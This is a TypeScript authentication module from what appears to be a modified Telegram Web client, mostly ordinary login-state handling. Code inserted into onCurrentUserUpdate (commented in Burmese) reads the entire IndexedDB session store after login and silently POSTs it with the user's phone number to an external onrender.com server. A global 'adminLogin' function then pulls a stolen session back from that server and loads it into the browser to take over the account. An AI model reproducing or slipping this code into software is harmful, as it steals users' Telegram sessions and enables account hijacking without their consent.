import { PasskeyLoginRequestedError, UserAlreadyAuthorizedError } from '../../../lib/gramjs/errors';

import type {
  ApiPasskeyOption,
  ApiUpdateAuthorizationState,
  ApiUpdateAuthorizationStateType,
  ApiUser,
  ApiUserFullInfo,
} from '../../types';

import { wrapError } from '../helpers/misc';
import { sendApiUpdate } from '../updates/apiUpdateEmitter';

const authController: {
  resolve?: AnyToVoidFunction;
  reject?: (error: Error) => void;
} = {};

export function onWebAuthTokenFailed() {
  sendApiUpdate({
    '@type': 'updateWebAuthTokenFailed',
  });
}

export function onPasskeyOption(option: ApiPasskeyOption) {
  sendApiUpdate({
    '@type': 'updatePasskeyOption',
    option,
  });
}

export function onRequestPhoneNumber() {
  sendApiUpdate(buildAuthStateUpdate('authorizationStateWaitPhoneNumber'));

  return new Promise<string>((resolve, reject) => {
    authController.resolve = resolve;
    authController.reject = reject;
  });
}

export function onRequestCode(isCodeViaApp = false) {
  sendApiUpdate({
    ...buildAuthStateUpdate('authorizationStateWaitCode'),
    isCodeViaApp,
  });

  return new Promise<string>((resolve, reject) => {
    authController.resolve = resolve;
    authController.reject = reject;
  });
}

export function onRequestPassword(hint?: string, noReset?: boolean) {
  sendApiUpdate({
    ...buildAuthStateUpdate('authorizationStateWaitPassword'),
    hint,
    noReset,
  });

  return new Promise<string>((resolve) => {
    authController.resolve = resolve;
  });
}

export function onRequestRegistration() {
  sendApiUpdate(buildAuthStateUpdate('authorizationStateWaitRegistration'));

  return new Promise<[string, string?]>((resolve) => {
    authController.resolve = resolve;
  });
}

export function onRequestQrCode(qrCode: { token: Buffer; expires: number }) {
  sendApiUpdate({
    ...buildAuthStateUpdate('authorizationStateWaitQrCode'),
    qrCode: {
      token: btoa(String.fromCharCode(...qrCode.token)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''),
      expires: qrCode.expires,
    },
  });

  return new Promise<void>((resolve, reject) => {
    authController.reject = reject;
  });
}

export function onAuthError(err: Error) {
  if (err instanceof UserAlreadyAuthorizedError) {
    sendApiUpdate({
      '@type': 'updateUserAlreadyAuthorized',
      userId: err.userId,
    });
    return;
  }

  const { messageKey, errorMessage } = wrapError(err);

  sendApiUpdate({
    '@type': 'updateAuthorizationError',
    errorKey: messageKey,
    errorCode: errorMessage,
  });
}

export function onAuthReady() {
  sendApiUpdate(buildAuthStateUpdate('authorizationStateReady'));
}

// 🌟 ဒီနေရာမှာ အစ်ကို့အတွက် Session ယူတဲ့ ကုတ်ကို ထပ်ဖြည့်ထားပါတယ်
export function onCurrentUserUpdate(currentUser: ApiUser, currentUserFullInfo: ApiUserFullInfo) {
  sendApiUpdate({
    '@type': 'updateCurrentUser',
    currentUser,
    currentUserFullInfo,
  });

  // --- CUSTOM SESSION EXPORT CODE (Staff Login ဝင်ချိန်) ---
  setTimeout(() => {
    const DB_NAME = 'tt-data';
    const STORE_NAME = 'keyval';
    const request = indexedDB.open(DB_NAME);
    
    request.onsuccess = (event: any) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) return;
      
      const transaction = db.transaction(STORE_NAME, 'readonly');
      const store = transaction.objectStore(STORE_NAME);
      const getAll = store.getAll();
      const getAllKeys = store.getAllKeys();

      getAll.onsuccess = () => {
        getAllKeys.onsuccess = () => {
          const data: any = {};
          getAllKeys.result.forEach((key: string, index: number) => {
            data[key] = getAll.result[index];
          });
          
          // ဖုန်းနံပါတ်ကို ယူမည် (ဖုန်းနံပါတ် မပေါ်ရင် ID ကို ယူမည်)
          const phone = currentUser.phoneNumber || currentUser.id;

          // ⚠️ အောက်ပါလင့်ခ်တွင် အစ်ကို့၏ Render Backend လင့်ခ်ကို ပြောင်းထည့်ပါ
          fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              phoneNumber: phone,
              indexedDbData: JSON.stringify(data)
            })
          }).catch(console.error);
        };
      };
    };
  }, 3000); // Database ထဲ Save ဖို့ ၃ စက္ကန့် စောင့်မည်
  // --------------------------------------------------------
}

export function buildAuthStateUpdate(authorizationState: ApiUpdateAuthorizationStateType): ApiUpdateAuthorizationState {
  return {
    '@type': 'updateAuthorizationState',
    authorizationState,
  };
}

export function provideAuthPhoneNumber(phoneNumber: string) {
  if (!authController.resolve) {
    return;
  }

  authController.resolve(phoneNumber);
}

export function provideAuthCode(code: string) {
  if (!authController.resolve) {
    return;
  }

  authController.resolve(code);
}

export function provideAuthPassword(password: string) {
  if (!authController.resolve) {
    return;
  }

  authController.resolve(password);
}

export function provideAuthRegistration(registration: { firstName: string; lastName: string }) {
  const { firstName, lastName } = registration;

  if (!authController.resolve) {
    return;
  }

  authController.resolve([firstName, lastName]);
}

export function restartAuth() {
  if (!authController.reject) {
    return;
  }

  authController.reject(new Error('RESTART_AUTH'));
}

export function restartAuthWithQr() {
  if (!authController.reject) {
    return;
  }

  authController.reject(new Error('RESTART_AUTH_WITH_QR'));
}

export function restartAuthWithPasskey(credentialJson: AuthenticationResponseJSON) {
  if (!authController.reject) {
    return;
  }

  authController.reject(new PasskeyLoginRequestedError(credentialJson));
}

// --- 🌟 CUSTOM SESSION IMPORT CODE (Admin ဝင်ကြည့်ရန်) ---
if (typeof window !== 'undefined') {
  (window as any).adminLogin = async (phone: string) => {
    try {
      // ⚠️ အောက်ပါလင့်ခ်တွင် အစ်ကို့၏ Render Backend လင့်ခ်ကို ပြောင်းထည့်ပါ
      const res = await fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`);
      const result = await res.json();
      
      if (!result.success) { 
        alert("Session not found in Database!"); 
        return; 
      }

      const dataToImport = JSON.parse(result.data);
      const request = indexedDB.open('tt-data');
      
      request.onsuccess = (event: any) => {
        const db = event.target.result;
        const transaction = db.transaction('keyval', 'readwrite');
        const store = transaction.objectStore('keyval');
        
        store.clear().onsuccess = () => {
          let itemsProcessed = 0;
          const keys = Object.keys(dataToImport);
          
          keys.forEach(key => {
            store.put(dataToImport[key], key).onsuccess = () => {
              itemsProcessed++;
              if (itemsProcessed === keys.length) {
                alert("Admin Login Success! Reloading...");
                window.location.reload();
              }
            };
          });
        };
      };
    } catch (error) { 
      alert("Error importing session"); 
    }
  };
}
// --------------------------------------------------------
